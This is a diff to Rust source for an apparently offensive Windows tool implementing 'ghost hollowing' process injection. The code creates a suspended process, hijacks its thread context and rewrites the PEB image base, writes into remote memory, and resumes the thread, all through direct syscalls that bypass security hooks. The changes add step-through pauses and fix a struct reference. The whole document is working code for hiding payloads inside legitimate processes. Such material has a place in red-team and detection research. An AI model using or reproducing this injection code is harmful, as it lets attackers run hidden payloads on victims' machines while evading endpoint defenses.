@@ -1,4 +1,5 @@
 use std::ffi::c_void;
+use std::io::{stdin, Read};
 use std::mem::{zeroed, size_of};
 use std::ops::Add;
 use std::ptr::{null, null_mut};
@@ -18,8 +19,8 @@ use windows_sys::Win32::System::Memory::{PAGE_READONLY, SECTION_ALL_ACCESS, SEC_
 use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER, IMAGE_NT_SIGNATURE};
 use windows_sys::Win32::System::Threading::{CreateProcessW, GetThreadId, CREATE_NEW_CONSOLE, CREATE_SUSPENDED, PROCESS_INFORMATION, STARTUPINFOW};
 use rust_syscalls::syscall;
-use crate::{types};
-
+use ntapi::ntpebteb::PEB;
+use crate::types;
 
 pub unsafe fn fetch_entry_point_offset(p_file_buffer: *mut u8) -> u32 {
     let dos_header =p_file_buffer as *const IMAGE_DOS_HEADER;
@@ -49,14 +50,20 @@ pub unsafe fn hijack_remote_process_execution(
         return Err("GetThreadContext failed");
     }
 
+    println!("[#] Press <enter> to continue");
+    let _ = stdin().read(&mut [0u8]).unwrap();
+
     // Thread hijacking
     let new_addr = (remote_base_addr as usize).add(entry_point_rva as usize) as u64;
     context.Rcx = new_addr;
     println!("[*] Entry point address: {:p}", context.Rcx as *mut c_void);
 
+    println!("[#] Press <enter> to continue");
+    let _ = stdin().read(&mut [0u8]).unwrap();
+
     // Process hollowing - get the offset to the PEB.ImageBase as element [PPEB is at Context.Rdx]
-    let offset = offset_of!(types::PEB, ImageBase);
-    let p_remote_img_base: *mut c_void = (context.Rdx).add(offset as u64) as *mut c_void;
+    let offset = offset_of!(PEB, ImageBaseAddress);
+    let p_remote_img_base: *mut c_void = (context.Rdx as *mut c_void).add(offset);
 
     let res = SetThreadContext(thread_handle, &mut context);
     if res == FALSE {
@@ -79,7 +86,8 @@ pub unsafe fn hijack_remote_process_execution(
         eprintln!("[!] Status: {}", status);
         return Err("NtWriteVirtualMemory failed");
     }
-
+    println!("[#] Press <enter> to continue");
+    let _ = stdin().read(&mut [0u8]).unwrap();
     Ok(true)
 }
 
@@ -220,6 +228,8 @@ pub unsafe fn create_ghost_hollowing_process(
         }
 
         println!("[i] Ghost process created with id: {}", process_info.dwProcessId);
+        println!("[#] Press <enter> to continue");
+        let _ = stdin().read(&mut [0u8]).unwrap();
 
         let mut p_base_addr: *mut c_void = null_mut();
         let mut s_view_size: usize = 0;
@@ -255,6 +265,9 @@ pub unsafe fn create_ghost_hollowing_process(
         ).expect("[!] Failed to hijack remote process");
 
         println!("[+] Resuming thread");
+        println!("[#] Press <enter> to continue");
+        let _ = stdin().read(&mut [0u8]).unwrap();
+
         let status = syscall!(
             "NtResumeThread",
             process_info.hThread,
